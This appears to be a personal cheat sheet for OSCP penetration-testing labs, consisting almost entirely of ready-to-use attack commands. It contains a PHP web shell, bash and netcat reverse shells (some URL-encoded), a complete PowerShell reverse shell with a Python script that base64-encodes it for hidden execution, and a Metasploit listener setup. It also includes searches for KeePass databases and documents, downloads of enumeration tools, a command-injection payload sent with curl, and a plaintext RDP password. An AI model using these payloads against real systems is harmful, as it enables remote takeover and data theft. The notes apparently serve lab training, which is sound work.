- SSH connection to OSCP machines
```
ssh -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" learner@192.168.50.52
```
- Bash One-Liners
```
	for ip in $(cat list.txt); do host $ip.megacorpone.com; done
```
- SecLists Project - collection of wordlists
- PHP command execution
```
<?php echo system($_GET['cmd']); ?>
```
- One liner reverse shell
```
bash -i >& /dev/tcp/192.168.119.3/4444 0>&1

bash -c "bash -i >& /dev/tcp/192.168.119.3/4444 0>&1"

bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.45.217%2F4444%200%3E%261%22


rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.118.2 1234 >/tmp/f

```

- powershell one liner reverse shell

```
$client = New-Object System.Net.Sockets.TCPClient('192.168.45.230',4444);$stream =$client.GetStream();[byte[]]$bytes = 0..65535|%{0}while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex '. { $data } 2>&' | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```
![[rev.ps1]]

Base64 encoding for powershell
```
$MyBase6 = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('$client = New-Object System.Net.Sockets.TCPClient("192.168.45.",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String ); $sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()' ))

$Bytes=[Convert]::FromBase64String($Text)
[System.Text.Encoding]::Unicode.GetString($Bytes)
```

msfconsole 

```
msfconsole -x "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST 192.168.50.1;set LPORT 443;run;"

```
find using powershell

Get-ChildItem -Path C:\ -Include \*.kdbx -File -Recurse -ErrorAction SilentlyContinue

Get-ChildItem -Path C: -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue

download powershell

```
iwr -uri http://192.168.118.2/winPEASx64.exe -Outfile winPEAS.exe
iwr -uri http://192.168.45.204:9090/Seatbelt.exe -Outfile seat.exe
```

network scanning
for i in $(seq 1 254); do nc -zv -w 1 172.16.203.$i 445; done

xfreerdp /u:justin /p:_SuperS3cure1337#_ /v:192.168.203.202

curl -X POST http://192.168.174.134:13337/update -H "Content-Type: application/json" -H "X-Forwarded-For: localhost" --data '{"user":"clumsyadmin","url":"http://192.168.45.230:8000/mint"}'

```
import sys
import base64

payload = '$client = New-Object System.Net.Sockets.TCPClient("192.168.118.2",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'

cmd = "powershell -nop -w hidden -e " + base64.b64encode(payload.encode('utf16')[2:]).decode()

print(cmd)

```

php reverse shell

https://github.com/ivan-sincek/php-reverse-shell/blob/master/src/reverse/php_reverse_shell.php


```
import os
os.popen("id").read()
```

### Upgrade shell

python -c 'import pty; pty.spawn("/bin/sh")'

curl -X  post --data "code=os.system('nc -e /bin/bash 192.168.45.162 18000')" http://192.168.175.117:50000/verify

```
%0Anc%20192.168.118.3%204444%20-e%20%2Fbin%2Fb

ssh -R 80:0.0.0.0:80 web_svc@192.168.240.147
